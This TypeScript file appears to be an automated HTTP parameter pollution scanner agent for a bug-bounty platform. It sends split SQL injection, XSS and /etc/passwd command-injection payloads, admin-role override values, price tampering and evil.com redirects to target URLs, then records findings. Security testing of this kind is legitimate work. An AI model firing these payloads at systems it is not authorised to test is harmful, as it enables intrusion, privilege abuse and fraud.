/**
 * HTTP Parameter Pollution Agent
 * Based on PayloadsAllTheThings/HTTP Parameter Pollution
 * 
 * Detects and exploits HPP vulnerabilities:
 * - Server-side HPP
 * - Client-side HPP
 * - WAF bypass via HPP
 * - Logic bypass
 * - Authentication bypass
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface HPPJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testServerSide?: boolean;
    testClientSide?: boolean;
    testWAFBypass?: boolean;
  };
}

// HPP Payloads and techniques
const HPP_PAYLOADS = {
  // Server behavior by technology
  serverBehavior: {
    // PHP: Last parameter wins
    php: 'last',
    // ASP.NET: Comma-separated
    aspnet: 'concatenate',
    // JSP: First parameter wins
    jsp: 'first',
    // Python/Flask: First parameter wins
    python: 'first',
    // Node.js/Express: Array or first
    nodejs: 'array',
    // Ruby/Rails: Last parameter wins
    ruby: 'last',
    // Go: First parameter wins
    go: 'first',
  },

  // Duplicate parameter techniques
  duplicateParams: [
    // Same parameter twice
    'param=value1&param=value2',
    // URL encoded
    'param=value1&param%3dvalue2',
    // Mixed case
    'param=value1&Param=value2&PARAM=value3',
    // Array notation
    'param[]=value1&param[]=value2',
    'param[0]=value1&param[1]=value2',
    // Semicolon separator
    'param=value1;param=value2',
  ],

  // WAF bypass via HPP
  wafBypass: [
    // Split SQL injection
    { param: 'id', values: ['1/*', '*/OR/*', '*/1=1'] },
    // Split XSS
    { param: 'q', values: ['<script', '>', 'alert(1)</script>'] },
    // Split command injection
    { param: 'cmd', values: ['cat', ' ', '/etc/passwd'] },
  ],

  // Authentication bypass
  authBypass: [
    // Override user parameter
    { param: 'user', values: ['attacker', 'admin'] },
    { param: 'username', values: ['attacker', 'admin'] },
    { param: 'role', values: ['user', 'admin'] },
    { param: 'admin', values: ['false', 'true'] },
  ],

  // Logic bypass
  logicBypass: [
    // Price manipulation
    { param: 'price', values: ['100', '0'] },
    { param: 'amount', values: ['100', '1'] },
    // Quantity manipulation
    { param: 'quantity', values: ['1', '1000'] },
    // Redirect manipulation
    { param: 'redirect', values: ['https://target.com', 'https://evil.com'] },
    { param: 'next', values: ['/dashboard', 'https://evil.com'] },
  ],
};

export class HTTPParameterPollutionAgent extends BaseAgent<HPPJob> {
  constructor() {
    super('hpp');
  }

  protected getSteps() {
    return [
      { name: 'Identify parameters', metadata: {} },
      { name: 'Test duplicate parameters', metadata: {} },
      { name: 'Test WAF bypass via HPP', metadata: {} },
      { name: 'Test authentication bypass', metadata: {} },
      { name: 'Test logic bypass', metadata: {} },
    ];
  }

  async process(job: Job<HPPJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting HPP testing');

    for (const url of urls) {
      try {
        // Detect server behavior
        const serverBehavior = await this.detectServerBehavior(url);

        // Test server-side HPP
        if (options.testServerSide !== false) {
          const serverFindings = await this.testServerSideHPP(url, serverBehavior);
          findings.push(...serverFindings);
        }

        // Test WAF bypass
        if (options.testWAFBypass !== false) {
          const wafFindings = await this.testWAFBypass(url);
          findings.push(...wafFindings);
        }

        // Test authentication bypass
        const authFindings = await this.testAuthBypass(url, serverBehavior);
        findings.push(...authFindings);

        // Test logic bypass
        const logicFindings = await this.testLogicBypass(url, serverBehavior);
        findings.push(...logicFindings);
      } catch (error) {
        logger.error({ error, url }, 'Error testing HPP');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async detectServerBehavior(url: string): Promise<string> {
    try {
      // Send test with duplicate parameters
      const testUrl = `${url}${url.includes('?') ? '&' : '?'}test=first&test=second`;
      const response = await fetch(testUrl);
      const body = await response.text();

      // Analyze which value was used
      if (body.includes('first') && body.includes('second')) {
        return 'concatenate'; // ASP.NET style
      } else if (body.includes('second') && !body.includes('first')) {
        return 'last'; // PHP/Ruby style
      } else if (body.includes('first') && !body.includes('second')) {
        return 'first'; // JSP/Python style
      }

      return 'unknown';
    } catch (error) {
      return 'unknown';
    }
  }

  private async testServerSideHPP(url: string, serverBehavior: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(url);

    // Test each existing parameter
    for (const [param, originalValue] of urlObj.searchParams.entries()) {
      try {
        // Duplicate the parameter with different value
        const testUrl = `${url}&${param}=hpp_test_value`;
        const response = await fetch(testUrl);
        const body = await response.text();

        // Check if HPP affected the response
        if (body.includes('hpp_test_value')) {
          findings.push({
            type: 'hpp-server-side',
            url,
            parameter: param,
            originalValue,
            injectedValue: 'hpp_test_value',
            serverBehavior,
            severity: 'medium',
            evidence: 'Duplicate parameter value reflected in response',
            impact: 'May allow bypassing security controls or manipulating logic',
          });
        }

        // Check if original value was overwritten
        if (!body.includes(originalValue) && body.includes('hpp_test_value')) {
          findings.push({
            type: 'hpp-parameter-override',
            url,
            parameter: param,
            severity: 'high',
            evidence: 'Original parameter value was overwritten',
            impact: 'Parameter pollution can override intended values',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testWAFBypass(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const { param, values } of HPP_PAYLOADS.wafBypass) {
      try {
        // Build HPP payload
        const hppParams = values.map(v => `${param}=${encodeURIComponent(v)}`).join('&');
        const testUrl = `${url}${url.includes('?') ? '&' : '?'}${hppParams}`;

        const response = await fetch(testUrl);
        const body = await response.text();

        // Check if WAF was bypassed (no block, payload executed)
        if (response.status !== 403 && response.status !== 406) {
          // Check for SQL injection success
          if (values.join('').includes('OR') && (body.includes('error') || body.length > 1000)) {
            findings.push({
              type: 'hpp-waf-bypass-sqli',
              url: testUrl,
              parameter: param,
              payload: values.join(' '),
              severity: 'critical',
              evidence: 'SQL injection via HPP WAF bypass',
            });
          }

          // Check for XSS success
          if (values.join('').includes('<script') && body.includes('<script')) {
            findings.push({
              type: 'hpp-waf-bypass-xss',
              url: testUrl,
              parameter: param,
              payload: values.join(''),
              severity: 'high',
              evidence: 'XSS via HPP WAF bypass',
            });
          }
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testAuthBypass(url: string, serverBehavior: string): Promise<any[]> {
    const findings: any[] = [];

    for (const { param, values } of HPP_PAYLOADS.authBypass) {
      try {
        // Build HPP payload based on server behavior
        let testUrl: string;
        if (serverBehavior === 'last') {
          testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${values[0]}&${param}=${values[1]}`;
        } else {
          testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${values[1]}&${param}=${values[0]}`;
        }

        const response = await fetch(testUrl);
        const body = await response.text();

        // Check for authentication bypass indicators
        if (body.includes('admin') || body.includes('dashboard') || 
            body.includes('welcome') || response.status === 200) {
          findings.push({
            type: 'hpp-auth-bypass-potential',
            url: testUrl,
            parameter: param,
            values,
            serverBehavior,
            severity: 'high',
            evidence: 'HPP may allow authentication/authorization bypass',
            recommendation: 'Test with valid session to confirm bypass',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testLogicBypass(url: string, serverBehavior: string): Promise<any[]> {
    const findings: any[] = [];

    for (const { param, values } of HPP_PAYLOADS.logicBypass) {
      try {
        // Build HPP payload
        const hppParams = values.map(v => `${param}=${encodeURIComponent(v)}`).join('&');
        const testUrl = `${url}${url.includes('?') ? '&' : '?'}${hppParams}`;

        const response = await fetch(testUrl);
        const body = await response.text();

        // Check if logic was affected
        if (response.ok) {
          findings.push({
            type: 'hpp-logic-bypass-potential',
            url: testUrl,
            parameter: param,
            values,
            serverBehavior,
            severity: 'medium',
            evidence: 'HPP accepted - may affect application logic',
            impact: `Potential ${param} manipulation`,
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store HPP finding');
    }
  }
}

export default new HTTPParameterPollutionAgent();
